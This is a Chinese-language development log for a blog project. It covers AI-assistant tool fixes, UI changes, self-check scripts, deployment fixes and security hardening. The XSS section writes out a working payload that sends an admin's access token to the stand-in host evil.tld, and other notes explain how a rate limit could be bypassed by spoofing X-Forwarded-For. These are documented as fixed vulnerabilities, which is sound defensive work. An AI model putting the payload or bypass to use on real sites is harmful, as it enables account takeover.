- `GET /hotspots/meta` 返回**全部分类与标签的分面计数**，实测 **78,484 字符**，塞给模型会撑爆上下文。前端要用这个接口所以**不改后端**，在 skill 层裁剪（分类留 20、标签留 30）→ 21,328 字符
- `list_blog_topics` 全量分类+标签实测 **55,790 字符** → 截断到 **1,069 字符**（-98%）

> **规律**：加 skill 时顺手看一眼返回体大小。后端接口是为前端设计的（一次给全），给模型用必须裁剪。

### 六、验证

- 后台技能逐个真实 dispatch：**20/22 直接通过**；另 2 个（`get_hotspot_detail`/`get_hotspot_sources`）用 `hotspot_id=1` 报 404 是**该 ID 不存在**，换真实存在的 16 后两个都 200
- 参数校验类行为也逐个验过：缺 `content_md` / 缺 `role` / 缺 `slug`+`topic_date` 都给出可读提示，不会发出无效请求
- 看板娘 9 个工具：**6/6 通过**
- 生产数据零变化、integrity ok、`tool_calls` 非法 JSON 0 条；公网冒烟全 200/401 符合预期
### 七、固化成回归自检：`backend/scripts/selfcheck_skills.py`（2026-09-30）

上面三个静默 bug 靠人工盘点发现，所以固化成可重复执行的检查。**零依赖**（只用标准库 `unittest`），项目本来连 pytest 都没装，不为一个脚本加依赖。

**跑法**（依赖齐全处均可；本机 Anaconda 缺 aiosqlite，要进容器）：

```bash
docker cp backend/scripts/selfcheck_skills.py qianxi-blog:/tmp/sc.py
docker exec qianxi-blog python3 /tmp/sc.py      # 服务器上（推荐）
python backend/scripts/selfcheck_skills.py       # 本地（若已装 backend 依赖）
```

脚本自己推断后端根目录（`__file__` 推不出就退回 `/app`），所以 docker cp 到 `/tmp` 也能跑。**不连数据库、不写任何数据。**

**6 组共 26 个用例**：

| 组 | 查什么 |
|---|---|
| `TestSchemaHandlerParity` | schema ↔ handler 一一对应、registry 不重名不漏模块、`execute_sql` 只对超管可见**且分派层双保险** |
| `TestRoutesExist` | **skill 打的路径必须存在于 FastAPI 路由表**（过一遍 `call_api` 真实的 `normalize_path`）；**query 参数名必须在该路由声明里**，否则会被 FastAPI 静默忽略 |
| `TestFieldMapping` | 逐条锁死 `keyword→search`、`content→content_md`、`topic_date`/`analysis_md`/`tag_names`、白名单字段不漏 |
| `TestRequiredArgs` | 缺必填必须在**发请求前**被拦下，且报错要说清缺什么 |
| `TestSafety` | token 不许出现在 body/query；批量删除必须有不可逆提示；「查找不活跃订阅者」只读 |
| `TestAragTools` | 看板娘 4 个导航工具在位，且 `_build_tools` 里不出现 `db.add/db.delete/db.commit` |

**验证过它真能抓 bug**（否则测试只是装饰）：往容器里注入 3 个 bug，全部被自动抓出——

```
注入 keyword 不映射到 search →  FAILED (failures=2)
    AssertionError: ["search_articles: query 参数 'keyword' 不在 /api/v1/articles 的声明里（会被静默忽略）"]
注入 content_md 改回 content   →  FAILED (failures=3)
    test_create_article_uses_content_md FAIL / test_update_article_uses_content_md FAIL
注入路径 /hotspots → /hotspot  →  FAILED (failures=1)
    hotspots.get_hotspot_sources: GET /api/v1/hotspot/1/sources 在路由表里找不到
还原后                          →  OK（26 passed）
```

> **改完 skill 必须跑这个**。它挡的正是最阴的那类 bug：不报错、只是结果不对，AI 拿着错数据继续编答案。
### 八、看板娘气泡输出美化（同日，提交 `1307fbe`）

聊天气泡一直复用 `markdownComponents`——那是给**文章正文**设计的（h1 `text-4xl`、段落 `mb-4`、表格单元格 `px-6 py-4`、引用块 `my-6`），塞进 `max-w-[80%]` 的小气泡里很松散，表格几乎撑破。

**更糟的是个真 bug**：原先靠 `[&_code]:text-slate-100` 这条 arbitrary variant 把代码块文字改成亮色，而它会连**行内 code** 一起染浅色——白色气泡上基本看不清。它和 `markdownComponents` 自带的 `text-slate-900` 同为 0-1-0 优先级，谁生效取决于 CSS 加载顺序，属于碰运气。

改动：

- **`MarkdownContent` 新增 `variant="chat"`**：一套为窄容器设计的组件集，显式分开处理行内 code（浅底 + 强调色）与围栏 code（暗底 + 语言标签 + 复制按钮），不再靠补丁。表格/引用/列表/标题都收到气泡尺寸；代码块**保留横向滚动**（原来 `[&_pre]:whitespace-pre-wrap` 会把语法高亮的缩进结构冲掉）。
- **`DesktopPet` 抽出 `ChatBubble` + `TypingDots`**：桌面悬浮窗和移动端弹窗原本各写了一份几乎完全相同的渲染（头像、气泡圆角、Markdown、参考文章卡片），改样式极易只改一处。现在只有一份。
- 气泡 `max-w-[80%]` → `max-w-[85%]`，外层加 `break-words`，长链接不再撑破布局。

**验证**（生产实测，17 项断言 0 失败）：真实对话拿回含表格 4 行 / 代码块 2 个 / 行内 code / 加粗 15 处 / 列表 3 项 的回复，逐项量计算样式——

| 测项 | 实测 |
|---|---|
| 段落字号 / 下边距 / 行高 | `13px` / `6px` / `22.75px` |
| 表格字号 / 单元格 padding / 横向滚动 | `12px` / `6px` / `auto` |
| **行内 code 字亮度** | **93**（深色字，白底气泡可读；修复前是浅色约 240） |
| 代码块 底色 / 字亮度 / 溢出 | `rgb(15,23,42)` / `244` / `auto` |
| 代码块语言标签 + 复制按钮 | 都在 |
| 列表缩进 | `14px` |

**向后兼容已验证**：`variant` 默认 `'default'`。文章页实测 h2=`30px`、段落=`16px`、表格单元格 `12px 16px`、复制按钮与代码块圆角均与改动前一致，评论/论坛/提示词同理。

> 这次验证靠的是**逐项量计算样式**而不是截图——本机浏览器的视口被外框限死在 ~400px 高，元素截图必然被上层 fixed 元素遮挡。涉及窄容器布局时，量 `getComputedStyle` 比截图可靠。

## 五期：后台 AI 助手（`/#/admin/ai-agent`）修复 + Cherry Studio 式界面（2026-09-30，镜像 `qianxi-blog:users7`）

一句话：**这个助手其实一直完全不可用**——所有技能都调不通，打开就 500。修了三个互相叠加的根因，并把界面重做成聊天工作台。提交 `5d6bba4` / `46715bb` / `3a7c27a`。

### 一、三个根因（都在同一条链路上，缺一不可）

| # | 现象 | 根因 | 修法 |
|---|---|---|---|
| 1 | 所有技能调用返回 500 | `call_api` 拼的基地址用 `settings.APP_PORT`（默认 **8000**），但容器内 uvicorn 监听 **7860**（8000 只是宿主机映射进来的端口）→ 每一次调用都 Connection refused。**宿主机 curl 8000 通、容器内 7860 通，两条路各自都"看起来正常"**，所以一直没暴露 | 新增 `SERVER_PORT` 配置专表容器内真实监听端口，`internal_base()` 用它 |
| 2 | 技能全部 404 | skill 里大量写成 `"/articles/"`、`"/comments/"`，路由注册的是 `"/articles"`（无尾斜杠）。Starlette **不会**为 router prefix 下的路径自动重定向，实测直接 404 | `normalize_path` 统一去尾斜杠、折叠重复斜杠 |
| 3 | `GET /agent/sessions` **整个 500** | 上游网关返回的 `function.arguments` **本身就是转义过的字符串**，直接入库变成二次转义（`{\\"days\\":7}`）→ 非法 JSON。而 `AgentSession.messages` 是 `lazy="selectin"`，查会话列表就会连带反序列化所有消息，**一条坏数据就让整个接口 500**，界面直接打不开 | 三处一起修：`LenientJSON` 类型（坏 JSON 返回 None 而非抛异常）+ `normalize_tool_arguments()` 入库前规范化 + 一次性修历史数据（已修 5 行，库已备份到 `pre-agent-json-fix-20260930-152552`） |

**顺带修掉的一个隐性 bug**：根因 3 的双重转义同时导致 `json.loads(arguments)` 失败 → 工具执行时 `parsed_args = {}` → **所有需要参数的技能（`manage_article` / `manage_comment` / `get_daily_stats(days=N)` 等）一直拿到空参数**。这个不报任何错，只是"效果不好"，比 500 更难发现。

### 二、补齐的会话接口

- `PATCH /agent/sessions/{id}`：会话重命名（原先 PUT/PATCH 都是 405，界面根本改不了名字）
- `GET /agent/sessions?keyword=&limit=`：搜索 + 限量，并回传 `message_count`
- ⚠️ 实现坑：消息数用 `outerjoin + group_by` 在 SQLAlchemy 2.0 下编译不过（同时 select 整实体又 group_by 主键）；已改成 `correlate` 的标量子查询。

### 三、界面（`frontend/pages/AgentChat.tsx` 重写）

- **思考过程与工具调用绑定到「消息轮次」（Turn）**，不再放全局 state——原先多轮对话时新一轮的思考会覆盖上一轮，且无法像聊天软件那样内联在回答上方
- 用户消息右对齐气泡；助手消息带头像；工具调用做成可折叠卡片（技能=青色 / 工具=琥珀色），显示入参与结果
- 侧栏：搜索、**按今天/昨天/近 7 天/更早分组**、hover 显示重命名与删除、每项带相对时间与消息数
- 空状态引导 + 4 个建议问题；**Enter 发送 / Shift+Enter 换行**（原先只有 Ctrl+Enter）；流式"停止生成"；输入框自适应高度
- `Icons` 补 `Plus` / `Pencil` / `Trash2`

### 四、验证（生产实测）

- **工具真的通了**：`get_site_overview` 返回 `{"ok": true, "status_code": 200, "url": "http://127.0.0.1:7860/api/v1/stats/overview", "data": {"total_articles": 23, "total_comments": 42, ...}}`，与库内计数一致；`get_daily_stats` 同样 200
- 最近 25 条消息的 `arguments`：可解析 11、非法 0
- 接口：会话列表 200 / 详情 200 / 重命名 200 / 搜索命中与空结果均 200
- **真机（Chrome）**：界面无白屏，侧栏分组与消息数正确，工具卡片可展开显示真实 JSON
- 上游模型侧确认正常：`finish_reason: tool_calls`，`AGENT_MODEL = grok-4.7`，`base = http://new-api:3000/v1`

### 五、界面二次美化（用户反馈"有点丑"，镜像 users8）

用户看到的第一版不好看，主要是**工具卡片展开就是一坨 `JSON.stringify`**，最抢眼也最难读。改动都在展示层，逻辑没动：

- 工具结果：成功时给人话摘要（关键指标 + 条数），原始 JSON 收进「原始数据」折叠区；失败时才摊开错误，并把 `127.0.0.1:7860` 显示成「本机」
- 指标与入参全部中文化：`today_views → 今日访问`、`article_id → 文章 ID`，兜底用 `humanizeKey()`（snake_case 拆词）；`{}` 空参数不显示
- 用户消息从青底白字（刺眼）改为中性浅底气泡
- 助手回答加专用排版常量 `PROSE`（用 className 注入，**不动全站共用的 MarkdownContent**，改了会波及文章页）：标题层次、列表缩进、代码块深色卡片、表格斑马纹、引用左框、行高 1.75
- 正文与输入区 `max-w-4xl`（`max-w-3xl` 在后台布局里两侧留白过多）
- 工具配色 amber → violet，与头像渐变呼应；思考块/头像/侧栏选中态/空状态统一为更克制的风格

**真机 DOM 复验**（比截图可靠，截图工具的 DPR 缩放会误导）：折叠头「技能 站点概览 完成」→ 摘要「5 今日访问 · 1 今日访客 · 23 文章总数 · 42 评论总数 · 0 待审评论 · 16 今日 AI 调用」；表格表头全中文。

### 六、SSE 与依赖 teardown 的时序坑（`DetachedInstanceError`，镜像 users9）

**症状**：后台 AI 助手发消息后，助手气泡里直接显示
`Instance <AgentSession at 0x...> is not bound to a Session; attribute refresh operation cannot proceed`。

**根因**（踩了两次才定位到，完整记下来）：

1. FastAPI 的 `StreamingResponse`，**依赖清理是在响应开始发送后执行的，不等生成器跑完**。
2. 所以在 `get_db` 的 `finally` 里加任何会 detach 对象的操作，都会让 SSE 生成器**第一行之前**就失效。
3. 而 `service.py` 在 `db.commit()` 之后仍读 `session.id` / `session.title` —— `commit` 默认 `expire_on_commit=True`，访问过期属性会触发 refresh，打到已 close 的 session 上就炸。

**我犯的错**：为了让一次 `database is locked` 消失，在 `get_db` 里加了 `await session.rollback()`。
**事后查明那次锁死不是产品缺陷** —— 是我自己的演练容器 `DATABASE_URL` 没隔离、连到了生产库（`e2e_setup_users3.sh` 只建了 `e2e-users5.db` 文件，没改环境变量），加上 `docker exec` 里崩溃的 python 留下的悬挂事务。
**为一次性、由自己操作造成的故障去改核心依赖，是这次两个线上 bug 的根源。**

**最终修法**（`get_db` 保持原样，只在代码里留一条警告注释说明为什么不能加 rollback）：

- `chat_stream` 入口把 `session_id` / `current_title` 存成局部变量，整个流不再碰 ORM 对象
- 自动命名改走 `UPDATE` 语句，而不是给对象赋值
- `api/v1/agent.py` 同样把 `session_id`、`current_admin.role` 提前取出
- **`api/v1/chat.py` 的 `/message/stream` 有完全相同的 4 处**（`session.id` ×2、`session.title =` 等），一并改掉 —— A-RAG 桌宠聊天是同款雷
- 异常不再只转成 SSE 事件：补 `logger.exception`，否则线上出问题日志里什么都没有

**验证**：在用户那个已有 14 条历史的真实会话上发消息（正是报错的那条路径）→ `event: done`、Detached 错误 0、工具真调用、回答为真实数据（23 篇 / 42 条）；新会话路径同样正常；浏览器里实发一条消息，`hasDetached: false`。自动命名也生效了（会话标题已变成首条提问）。

### 七、遗留

1. **演练容器必须显式指定独立 `DATABASE_URL`**：`e2e_setup_users3.sh` 只建库文件不改 env，容器仍连生产库。已因此锁死过一次。**用之前先确认这个脚本的 env 处理。**
2. **会话无归属**：`agent_sessions` 是后台专用（admin 才能访问），暂不加归属字段。
3. **验证 AI 助手需要 admin token**：目前靠服务器签发 30 分钟短期 JWT + 临时引导页 `_t.html`（用完即删，已确认 `/_t.html` 回退到 index.html 不含 token）。若要长期做界面回归，建议加一个仅本地可用的调试入口。

## 用户系统四期：XSS 收口 + 契约补齐 + 首屏性能（2026-09-30，镜像 `qianxi-blog:users5`）

一句话：**堵掉一条能偷走管理员 JWT 的存储型 XSS，补齐三处前后端契约断链，把首屏 JS 从 2.88MB 压到 0.32MB**。提交 `86c3ad5` / `469e5a8` / `6d641e5`（均已推 GitHub）。

### 一、存储型 XSS（此前无人发现，危害最高）

- **根因**：`components/MarkdownContent.tsx` 的 `allowHtml` 默认值是 `true`，且开启时挂 `rehypeRaw` 解析原始 HTML，**全链路没有任何消毒**（无 `rehype-sanitize` / DOMPurify）。
- **打法**：匿名评论创建即 `status="approved"`（`comments.py`），只需
  `POST /api/v1/comments/article/{id}` 带 `<img src=x onerror="fetch('//evil.tld/?t='+localStorage.getItem('access_token'))">`，
  管理员打开自己文章即触发 → 拿走 24 小时有效的 JWT → 接管超管会话。
- **为什么是遗漏而非设计**：热点评论、论坛、Agent 聊天**全都显式传了 `allowHtml={false}`**，只有文章评论这一条漏了。
- **修法**：默认值改成 `false`（安全默认）、所有用户可提交内容的渲染点显式传 `false`、新增 `rehype-sanitize` 并**排在 katex/highlight 之前**（它们自己生成的 class 才不被剥掉）、文章正文显式开 `allowHtml` 但仍过消毒。协议白名单只留 `http/https/mailto`。
- **回归测试**：`frontend/__tests__/xss-regression.test.ts`（`npx vitest run`，5 条：事件属性、`<script>`、`javascript:`、正文开 HTML 仍被消毒、正常图片链接不被误伤）。

### 二、前后端契约断链（前端在调、后端没有/对不上）

| 症状 | 根因 | 修法 |
|---|---|---|
| 访问 `/#/article/{slug}` 恒 404 | `api/articles.ts` 的 `getArticleBySlug` 一直在调 `/articles/slug/{slug}`，**后端没有这条路由** | 补路由。⚠️ **必须注册在 `/{article_id}` 之前**，否则被 int 转换吃掉报 422。`articles.slug` 目前全站无写入路径（恒 null），属"先补齐契约" |
| 作者主页整页白屏 | 前端 `PublicUserProfile` 声明成 `{user, articles}`，后端 `UserProfilePublic` 是**扁平**结构 → `profile.user.display_name` 抛 TypeError | 类型改 `extends PublicAuthor`，取值改 `profile` |
| 桌宠/看板娘聊天历史永远加载不出来且**不报错** | `get_session_history` 函数**没有路由装饰器**是死函数，前端异常被 try/catch 吞掉 | 补路由 + 归属校验 |

### 三、chat / prompt 的匿名面收紧

- `chat_sessions` **没有任何归属字段** → `DELETE /chat/session/{id}` 任意匿名可删任意会话，往他人会话写消息还会把其历史喂进 LLM。补 `user_id` + `owner_ip` 两列（`core/database.py: ensure_schema_columns()` 幂等 ALTER，**挂在 lifespan 上、不能挂 `settings.DEBUG`**——生产 `DEBUG=false`，挂错地方新代码上线直接 500）+ 归属判定。
- 提示词详情端点**零 status 过滤** → 匿名遍历 id 就能读 pending/rejected 全文（列表端点是有 `status=="approved"` 过滤的）。访客/普通用户只读已通过审核的。
- chat 与 prompt-lab **无任何限流** → 未认证即可无限放大模型费用。补进程内限流（chat 20/分钟、chat message 6/分钟、prompt-lab 10/分钟）。
- `prompt_lab` 把 `str(e)` 回显给调用方（可能带上游地址/密钥片段）→ 改为只记日志。

### 四、首屏性能（真机 Chrome 冷缓存实测）

| 项 | 改前 | 改后 |
|---|---|---|
| 入口主包（原始） | 3,017,034 B | **325,486 B**（-89.2%） |
| 入口主包（gzip 实传） | 3,017,034 B（**gzip_types 被注释，等于没开**） | **103,958 B**（-96.6%） |
| 首页 DCL | 913 ms | **343 ms** |
| 文章页传输 | 1,360 KB | **788 KB** |
| 作者页传输 | 7,754 KB | **2,709 KB**（封面图懒加载，-65%） |

- `App.tsx` 33 个页面全静态 import → 改 `React.lazy` 路由级分割（产物 1 个 chunk → 98 个，首页只加载 6 个）。
- `nginx.conf` 的 **`gzip_types` 整行被注释**（nginx 默认只压 text/html，JS/CSS/JSON 全不压缩）→ 补全 16 种类型；带 hash 的静态资源加 `immutable` 缓存头。**brotli 没加**（`nginx -V` 实测无该模块，加了 `nginx -t` 会失败）。
- 封面图全站零 `loading="lazy"` → 文章列表/作者页/侧栏补上；首页首图保持 `eager`（首屏可见，lazy 反而更慢）。

### 五、部署链的四处数据丢失风险（都已修，务必知道）

`deploy_frontend_dist.sh` 连续三次翻车，每次都靠脚本自带的 `trap ERR` 回滚保住数据：

1. **`APP_ROOT` 与 nginx root 不一致** —— 脚本写 `/data/My_Blog/frontend/dist`，nginx 读 `/var/www/blog/dist`，**产物一直写进没人读的目录**，线上跑的是两天前的包。已改为以 nginx root 为准，旧路径做软链。
2. **整目录 `mv` 掉再只搬 live2d** —— 把 `uploads`（用户上传图，**实测丢过 5 张**）、`.well-known`（ACME 证书续期）、`data`（AI 日更 cron 每 30 分钟写入）一起清空。
3. **保留逻辑第一版写成"目录不存在才整目录搬"** —— 被新包自带的 `dist/uploads` 顶掉，**又丢 5 张图**。
4. **改成 union 合并后又只 `mkdir` 顶层目录** —— `uploads/images` 子目录不存在导致 `cp` 失败；且 `set -euo pipefail` 下 `find|wc` 对空目录返回非 0 直接中断脚本。

现在：逐文件 union 合并（线上有、新包没有的才补，父目录逐个建）、统计走 `count_files()` 兜底、**打包时排除 `uploads/data/live2d` 交给脚本保留**。
⚠️ **另外**：该脚本曾出现「打印 `DEPLOY_OK` 但实际没换文件」（服务器上残留旧包）。**现在每次部署后必须强校验**：`线上 index.html` 引用的文件必须存在于新包内。临时用 `b_deploy_manual.sh` 的手动原子替换绕过。

### 六、真机验证抓到的两个静态检查抓不到的回归

- `PublicLayout.tsx` 的 `requestIdleCallback` 被写成 `ric(window, cb)`（第一参数必须是回调）——因为用了 `as any` 绕开类型检查，**`tsc` 与 `build` 都不会报错**，线上直接抛 `parameter 1 is not of type 'Function'` 首页整页崩。**ErrorBoundary 接住了**（显示可读错误而非白屏），所以那批改动才有救。
- 结论：前端改动**必须真机跑一遍**，`tsc + build` 不足以证明可用。

### 七、本期上线证据

- 演练容器（`users5` + 全新库）：三套验收 **users 55/0 + email 46/0 + admin 101/0**；批次一专项探针 **23/0**；批次三专项探针 **18/0**（含：chat 越权删除 403、history 路由 200、匿名读未审核 prompt 404 且已审核仍可读、限流依赖已挂在 4 个端点、slug 路由不再 422）。
- 生产（`users5`）：数据零变化（文章 23 / 评论 42 / 用户 2 / 提示词 25 / 订阅 16，integrity ok），探针残留 0；公网冒烟全 200/401/404 符合预期。
- 真机（Chrome 冷缓存）：首页/文章页/登录页/后台登录页/作者页/文章列表/归档/提示词/热点 **9 条路由全部正常渲染，无白屏、无 console 报错**。
- **一次 A-RAG 验收失败是上游模型网关返回 `503 system cpu overloaded`**，不是代码回归（重跑即 55/0）——遇到先查日志再下结论。

## 用户系统三期：坏功能修复 + 权限收口（2026-09-28，镜像 `qianxi-blog:users4`）

一句话：**修好 6 个「看着有、实际不可用」的前端功能，收掉 8 个越权/枚举面**。后端 12 个 `.py`、前端 11 个文件（2 个新增：`ErrorBoundary.tsx` / `utils/errors.ts`）。提交 `8f1aac5`（已推 GitHub）；补漏提交 `23e310a`（已推）。

### 修好的坏功能（此前都"看着能用"）

| # | 现象 | 根因 | 修法 |
|---|---|---|---|
| 1 | 用户端**编辑文章正文恒空**，编辑功能实际不可用 | 编辑页从 `GET /users/me/articles` **列表**取正文，而列表走简化模型 `ArticleListResponse`，**不含 `content_md`** | 新端点 **`GET /api/v1/users/me/articles/{article_id}`** 返回完整 `ArticleResponse`（含 `content_md`）；`api/users.ts` 新增 `getMyArticle(id)`；`WritePage.tsx` 改调它，并不再只搜列表前 100 条 |
| 2 | 编辑页一打开就白屏（`Objects are not valid as a React child`） | 后端 `tags` 是**对象数组**，前端把对象直接丢给 `setSelectedTagNames` | 先 `.map(t => typeof t === 'string' ? t : t.name)` 归一化再进 state；`UserArticle.tags` 类型改为 `Array<string \| {id?, name, slug?}>` |
| 3 | 点「保存草稿」弹「已下架」，**线上还挂着** | `api/articles.ts` 的 `updateArticle` 按白名单挑字段，**把 `status` 丢了** | 转发 `status`（`ArticleCreate` 补 `status?`） |
| 4 | 后台「相关新闻」点了 404 | 链到 `/article/${item.slug \|\| item.id}`，而 `/article/:slug` 依赖"按 slug 查文章"的后端接口——**后端没有这条路由**，只要 slug 非空就是死链 | 侧栏改链 `articles/:id` |
| 5 | 密码填 7 位提交后**整站白屏** | FastAPI 422 的 `detail` 是**数组**，被 `error.response?.data?.detail` 直接塞进 JSX | 新增 `frontend/utils/errors.ts` 的 **`errorText()`**，`UserCenter.tsx`/`AdminProfile.tsx` 全部改走它；密码框 `minLength` 6→**8**（后端 `PasswordChange` 要求 ≥8），文案改「至少 8 位字符」 |
| 6 | 任何渲染异常 = **整站白屏** | Provider 树里没有 ErrorBoundary | 新增 `components/ErrorBoundary.tsx`，`App.tsx` 顶层包住整棵树 |

### 收掉的越权 / 枚举面

| 面 | 改前 | 改后 |
|---|---|---|
| 管理员改密 | `PUT /admins/{admin_id}/password`：**超管改自己可免旧密码** | **改自己密码任何角色都必须带 `old_password`**（超管改**他人**仍可免，那是后台重置场景）；成功时写 `password_changed_at`，**旧 token 立刻 401** |
| 用户自助改密 | `PUT /auth/password` 的 `old_password` 可不填，直接改密 | **改为必填**（缺 → 400「请提供旧密码」） |
| 旧 token 失效判据 | 内联在 `get_current_user`；`comments.py` 的可选登录依赖 `get_comment_author` **漏判** → 登出后还能继续评论 | 抽成单一函数 **`core/deps.py: token_is_stale(user, payload)`**，两处共用。`PUT /admins/users/{user_id}/password`（后台重置普通用户）本来就写 `password_changed_at` |
| AI 助手工具面 | `build_all_tools()` / `dispatch()` 没有角色概念，`execute_sql`（**绕过全部接口层权限**）对所有管理员可见，`allow_write` 采信**模型给的参数值** | **双层闸门** `build_all_tools(role)` + `dispatch(..., role)`；`execute_sql` 只对 `super_admin` 暴露（普通 admin **连 schema 都拿不到**，直接构造调用**也会被 dispatch 拒**）；`allow_write` 改由**服务端按角色**决定。角色由 `api/v1/agent.py` 透传 `current_admin.role` |
| AI 助手外呼 | `services/agent/tools/call_api.py` 的 `normalize_path` 原样接受绝对 URL，**会把调用者的 JWT 发到任意外站**（外带凭证 + SSRF） | 拒绝 `http://` `https://` `//` 开头；站内相对路径照旧拼成 `http://127.0.0.1:8000/...` |
| 登录爆破 | `POST /api/v1/auth/login` **无限流** | 加 `rate_limit("login", limit=10, window_seconds=60, key_scope="ip")` |
| 邮箱枚举 | `POST /api/v1/auth/password/reset/code`：已注册 400 / 未注册 200 | **一律 200 + 逐字相同的一句话**；邮箱不存在时走**同一套**域名/冷却/频率校验并落库，`deliver=False` 只占额度不发信（`send_code` 新增 `deliver` 参数） |
| 验证码并发 | `verify_code` 先查后改，并发可**双花 / 丢更新** | `services/verification_service.py` 改条件更新 + `rowcount` **原子消费**（`UPDATE … WHERE used_at IS NULL`），错码次数用 `attempts = attempts + 1` 原子自增 |

### ⚠️ 三个代价 / 前置条件（别当免费收益）

- **登录限流依赖 nginx 覆写 XFF，否则形同虚设**：限流是**进程内**的（2 worker 各持一份，实际额度≈2×），ip 维度取 `request.client.host`，而 uvicorn `--proxy-headers --forwarded-allow-ips=*` 取 `X-Forwarded-For` 的**第一个**值。原 nginx 配置是 `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`（**追加**），客户端自带 XFF 即可伪造来源 IP 绕过限流。**必须改成 `proxy_set_header X-Forwarded-For $remote_addr;`（覆写）**。该改动是否已落地见「待办」8。
- **重置密码发码统一话术的代价**：真正被限流/域名不允许的**已注册**用户也只会看到"已发送"，得等冷却结束再试。
- **后台角色闸门是信息暴露修复，不是提权修复**：`AdminLayout.tsx` 加 `isAdmin` 闸门（非管理员跳回 `/user`），`AdminLogin.tsx` 登录后校验角色、非 `admin`/`super_admin` 直接登出并提示走普通入口。**后端管理接口本来就有 `get_current_admin` 守卫**。

### 本批验证（证据见「验证」小节）

演练容器 `qianxi-e2e`（`qianxi-blog:users5`，127.0.0.1:8001，全新库 `e2e-users5.db`，账号 `e2e_admin`）三套 **users 55/0 + email 46/0 + admin 101/0**，与 users3/users4 基线一致无回归；专项探针 批次一 **23/0** + 批次三 **18/0**；镜像内容核对、AI 工具闸门容器内直调（不烧 LLM quota）、前端 `tsc --noEmit` + `npm run build` + XSS 回归测试 5/5 均通过。生产（`users5`）数据零变化，探针残留 0。

## 用户系统二期：三级权限 + 邮箱认证（2026-09-28 上线，镜像 `qianxi-blog:users3`）

**权限矩阵（`user` / `admin` / `super_admin`）**——判据只有一条：**数据库里的 `users.role`**（token 只带 `sub=user_id`）。

| 能力 | user | admin | super_admin |
|---|---|---|---|
| 增删改**自己**的文章（草稿/待审范围内） | ✅ | ✅ | ✅ |
| 删**自己**的评论 | ✅ | ✅ | ✅ |
| 删**别人**的评论 | ❌ 403「只能删除自己的评论」 | ✅ | ✅ |
| 审核文章（通过/驳回） | ❌ | ✅ | ✅ |
| 封禁/解封用户、重置其密码、看用户列表与详情 | ❌ | ✅ | ✅ |
| 改角色、改他人邮箱、删用户、管理员账号管理 | ❌ | ❌ | ✅ |
| 增删改**自己**的提示词投稿（仅 `pending`/`rejected`） | ✅ | ✅ | ✅ |
| 提示词审核/删除任意提示词 | ❌ | ✅ | ✅ |

- **管理入口搬成侧栏独立页**：`/admin/users`（前端 `pages/AdminAccounts.tsx`，侧栏「用户与权限」）。后台仪表盘的旧 tab（用户管理/管理员账号）已移除，能力全部平移到该页：统计卡、状态/角色筛选、搜索（含邮箱）、排序（注册时间/最后登入/文章数）、详情抽屉（`components/UserDetailDrawer.tsx`：改角色、重置密码、绑定邮箱、封禁、删除）、管理员账号增删改密。
- **最后登入时间**：`users.last_login_at`，登录成功时写（`auth.py` 登录分支）。列表与详情都展示。
- **改密踢会话**：`users.password_changed_at` 由自助改密/重置密码写；`deps.get_current_user` 比对 token 的 `iat`（`core/security.py` 里 `iat` 必须是**浮点秒**——曾经用 `int()` 截断，导致「同一秒内改完密码再登录」被自己签发的 token 判为过期而 401，`044dd6b` 修掉）。
- **邮箱认证**（对齐主服务器 new-api 的做法）：`services/verification_service.py` + `email_codes` 表（存 sha256(code)，10 分钟有效、最多试 5 次、60 秒重发冷却、单邮箱 5 次/天、单 IP 10 次/小时）。用途三类：注册、重置密码、绑邮箱。
  - **注册强制邮箱验证**（站点设置 `email_verification_required=true`；置 false 可退回一期「只填用户名口令」）。两步式：`POST /auth/register/code` 发码 → `POST /auth/register` 带 `code` 落地。
  - **自助重置密码**：`POST /auth/password/reset/code`（对不存在的邮箱**也返回 200**，防枚举）→ `POST /auth/password/reset`。
  - **绑定/更换邮箱**：`POST /users/me/email/code` + `PUT /users/me/email`。
  - **白名单**：`email_domain_whitelist`（站点设置，逗号分隔，空=不限）与 new-api 保持一致：`gmail.com,163.com,126.com,qq.com,icloud.com,foxmail.com`。
  - **SMTP 走主服务器 new-api 那套 Brevo relay**（`smtp-relay.brevo.com:465`，账号 `aaa2f9001@smtp-brevo.com`，发件 `noreply@qianxi7988.me`）。**凭据只在 `/data/blog/runtime.env`（600）里，密文不落库不进 Git**；`SMTP_HOST/PORT/USER/PASSWORD/FROM_EMAIL/FROM_NAME/USE_TLS` 七个键。发信是 stdlib smtplib（阻塞）→ `asyncio.to_thread`；发失败会回滚验证码并返回「邮件发送失败，请稍后再试」。
- **提示词投稿改为登录用户投稿**：`POST /prompts/submit` 需登录（`get_current_user`），提交者从账号取（不再让前端填昵称），限流 **3 次/天/用户**；新增用户自域接口 `GET/PUT/DELETE /users/me/prompts[/{id}]`（只能动自己的，且只限 `pending`/`rejected`）。**`prompts.author_id` 外键已从 `admins.id` 改指 `users.id`**（`scripts/migrate_users_v3.py` 重建表，25 行零改动迁移）。
- **删用户的语义（别照文档想当然）**：`Article.author_id` 是 **NOT NULL**（模型与线上库一致），所以文章**不能**「归属置空保留」。当前实现：该用户有文章时 `DELETE /admins/users/{id}` 返回 **409** 并附文章/评论/提示词数量，前端抽屉显示说明 + 「连同其文章一起删除」二次确认（`?with_content=true`）；确认后逐篇走 ORM `db.delete()`（与 `DELETE /articles/{id}` 同路径）+ 清文章缓存。评论/提示词可空，仍按**置空保留**。守卫：不能删自己、不能删最后一个超管。
- ⚠️ **外键级联在这里是假的**：`core/database.py` 只设了 WAL/synchronous/busy_timeout，**从未 `PRAGMA foreign_keys=ON`**，SQLite 默认关闭 → 模型里的 `ondelete="CASCADE"` 不生效。删行必须走 ORM 关系或手工清子表，**不要**用批量 `delete(Article)`。
- **迁移脚本** `/data/blog/migrate_users_v3.py`（幂等，可反复跑）：users 加三列（`email_verified`/`last_login_at`/`password_changed_at`）+ 建 `email_codes`（2 索引）+ 回填有邮箱的存量账号 `email_verified=1` + 重建 `prompts` 表把 FK 指到 `users.id`。**必须在应用停止时跑**。切换前备份：`/data/blog/backups/pre-v2-20260928-163845/`（27MB，integrity ok）。
- **回退**：`bash /data/blog/rollback_users2_v2.sh /data/blog/backups/pre-v2-20260928-163845`（停容器 → 还原库 → 起 `qianxi-blog:users2`）。前端回退文件留在 `/data/blog/backups/frontend-pre-v2-20260928-163845/index.html`（旧主包仍在 dist，无需回滚包）。
- **限流新增**：注册发码/绑邮箱发码 10 次/小时/IP、自助重置 5 次/小时/IP、提示词投稿 3 次/天/用户。**双 worker 各持一份进程内桶 → 实际额度约 2×**（验收脚本据此探测 429，不要写死"第 4 次必被拦"）。
